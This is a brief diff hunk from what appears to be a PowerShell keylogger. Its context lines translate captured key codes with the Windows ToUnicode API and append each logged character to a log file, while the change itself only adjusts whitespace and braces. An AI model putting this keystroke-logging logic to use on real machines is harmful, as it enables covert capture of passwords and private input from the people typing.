@@ -54,12 +54,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
             # add logged key to file
             [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
-            }
-
-            
-
-            
-            
+   
           }
         }
       }
